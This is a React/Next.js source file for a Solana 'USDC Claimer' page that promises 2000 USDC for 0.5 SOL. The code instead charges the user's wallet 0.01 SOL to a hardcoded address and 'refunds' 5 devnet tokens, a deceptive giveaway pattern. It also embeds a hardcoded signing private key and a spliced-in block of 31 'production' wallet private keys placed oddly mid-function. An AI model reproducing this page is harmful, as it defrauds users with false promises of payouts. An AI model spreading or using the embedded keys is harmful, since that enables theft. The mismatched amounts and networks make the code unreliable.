/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4PxgVqvTazQsUN21zuuwu3jRBmhp54r2WwYXKjGu37jAdsqAczMfLvynTm5o9QSopvBHwtesPhztNbfmaViZ6UJ1"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "GA4ah9N6FVjNVSdNuNW9G9B5amf7xQWDtyivrU8hQNqD4Z4YHY29RJtQfChH2GWgWDU7yG3tdR9doDzD7eqsa62",
  "key1": "4bQYeUn2FDYGgFu2RuKjvFLXebvyQzXeqnM8tNLsdNGqkNVkS8FxjTjE5s1Kybjpo28gLfUHg76dSUmW67TnHD6t",
  "key2": "3fBeMkhMHyBghCrDvFa6LGLHj9HV3ggwHS62WUxk8ELgXq6LpM74nRDuuALoVBvxa8JKY9MP8dKKVonFTiM1zqRJ",
  "key3": "3sW9ofak5vVYa7wNyHzLNEbgwAcbSEPcAvfZPQJnAw6TRzXCGngAoApd7KKjb6kKGkj2BJ8xjWjbJbaLaA1Us2Fw",
  "key4": "M92Y1NjqR6Me8TeweFzJ5jqmp129JDGveXLkobSKnNEupEzxrjXUkwoAjGZXCQ1YSxsfN7f1b36Kt53Ph2WnGJc",
  "key5": "dRLFAnAnZPgCiuRrUp18kufnL5MGgfDyHDuWkYAb81Yz7V3Vnk8dABqHYfjquXLvJDCEGaqp1EZsQMmscS8QbnS",
  "key6": "3b93wzyM4TF8yFTVgjGBnVTxMkD7BVMqfErTx3uE1W86P8CW249J7RB6qA3DkipTBVWeU5GomG8tjaba7G9TaXY3",
  "key7": "454514hpeGKK9KNxpkJvgSmYNzcNV6o5YRNszXELrGecmACU4hk9yQjDF93mNdDwKp1xdRajxJGPVaqDpCNhnrBU",
  "key8": "4XXNv1G7hF7vtoemAVoEPRyi35vjqJ7B7FB3xFsqLTi8Xg5qN6CgQVtMwGpTvShizaMhrNE4gqw8p2poHnE1FG3C",
  "key9": "4KN9QhYFujBULWRXAA1doZLe95JqfJvZPqC7FyZ1bj6ePJsTRWZKovfvsGWgjk7f1hbmCuZpkLGu9RFW8AjKXwyF",
  "key10": "619eytByWLkrFNA6ZgXzPfoE64xhrnRdGjWSXyS5Ye7unwNJudRN3Ka6uNWQCP5cd3cx8NDiUoJaMbTbK4Xcqd2P",
  "key11": "3r32HVXShQnQmhSxRZBSXABQRF8SvZ7VZGS4Ve6VH9hEjwbMaJ3Vpq8JYEqXhjk3F7xgCkC6t1ZVFJ6BkGDXboPA",
  "key12": "3b8fbyjY32QuwBCrkgn31yN3DdssFC2UfCTMV8FfhW5ZEAzJnsJZcwLtiBSGVUYPM5Ey9KP1yMUgTDrs144VpU3F",
  "key13": "5N9mWSYkL6KtvYovDmv5dXca8HoKpycovMFb4pvRANAJJ3sjhqukU4iqZXGzHr5fnkwto1tWgbP49neaAMCRWEzz",
  "key14": "5CYyuzH5xUDwyqe1BEoULCk9GNyRGdZQJ1SEdXP3gGTXXRvnKtrQRbHvdaBycmS33RVSJGEa2MbXkYYaACQZCHy1",
  "key15": "2aMRjJL1VZ8Q8kQA6odDx6axdWFm923rouJiRs6ABabLyKWfyjVbxGvdS5e54xYauoyrvQXPthFNXnvMFNURVQYH",
  "key16": "5G3qW3iJZtaD94rHSdfKbaDYVerT8csot44bBVPdiNr8UNcfQCbuJzSsoeLsqUsEE4tTeSSswJ8WbQqmMnsXhgfz",
  "key17": "3FaRyGfPWYdC1GKh5PZ4y4o3qQBANW4xdB952B1vyeQaWeiGCUnFEezLkCdUuqJHmVrtnKyWjMLn7mVdPQy5dure",
  "key18": "3D8mwyHWkq1kcF5Nm1DKgM8w1UKMmWSo7zGRx4awYUKQpt3mmuEKpeNLhH58hZ9SbWZk5HPktPaoijmNzRK9aujf",
  "key19": "3JHb2Pe8qjA4iMqUajJHGtPv552sXcfFx1SEpQ9N9caJQ7msw2nUrGg9mxCELF4MJ8G6C5S7D7Ff7GxCa6YTGTNM",
  "key20": "5hp2LkVhLmwZN2uCfyzjGDmUhnnn7WVuNRpsjvaWUP3dFA3vjxRT3yz3ozznEwXJJWU1JAW29DeL5aBUbM8YCJfY",
  "key21": "2dcfcX5Qi1wUQeT1EyTzBAXAHwG2puQ5fbA4ofqgwvQ62UtjbVQeDwnYSLhGZ3ks3oPWbhoix5TcyXq12GbZzbz9",
  "key22": "2D38m4SBGKKWs7B3PRifF1wtzvoknv4f8aNfuUBshHP6c1Neh5SFNdCSji7Gn6L5t2f5cwaCuixkACqbLoyHfVqv",
  "key23": "Btu95VYX6HRmD2rjza1VTDqsSaXB9q9yncjxqXcyG5Y78TMqxmNijhobM8KxAqkbqFfkDumGdhmCfEGaVbYNhH9",
  "key24": "4yF78hAUwEkgcQdhu1xgCjnZ7v6rNPcUuyS9afMhC1TPs2pVUVLPHFVnLCks25p8YLqwF3g7fPoducTU42SEAeNk",
  "key25": "5PMqaFpFuCNbArZXUxX4Tbf1XEVsWuHuZp6sytEHDtfBBBqLdPiVZkB6eZ1UXZ9SXfWekFppkevfPW5ajgwMGRE3",
  "key26": "NQZA29PFKd1hB5xBkjyVYZsEZ71PeaEcqKnKeWE6jBRwt6PPTaPnp4rJBvt1JC3LqBWu9qAuq6HpZATHzCx9VRX",
  "key27": "129J7787tPrgWcsxRKJPcYKg4meaqPDstiUhRmZyWQGxUW9hqAtSnV7jtH3mVbnKk6vo4eTYHpFdcwsAXBWzeGXf",
  "key28": "5JoZWCfX9QoJTh3ZEFaKfnJTkBm2fTdNRdsTS2cxNBKQwwSUmGLPxhkTLpX8PzxX5DcNRLZAdXEvmhwETTKVPw4q",
  "key29": "4j9Z4zVAcYLqUFBw5H9VcKZ2Bue4MBjAsC6Yt74VEYuiXr4ZbT4BoDLzZiH3EUWQo4Yha8U8zviM5nBE4tGGHiDY",
  "key30": "44mkh6LffBJ2i1GQis6FzHwuFDrUg93jLhWiyUNvodjqcV8quoXJR8MUDvv2vqEmM5mK5wfX7cWJ2BKzi9uNwQKm"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
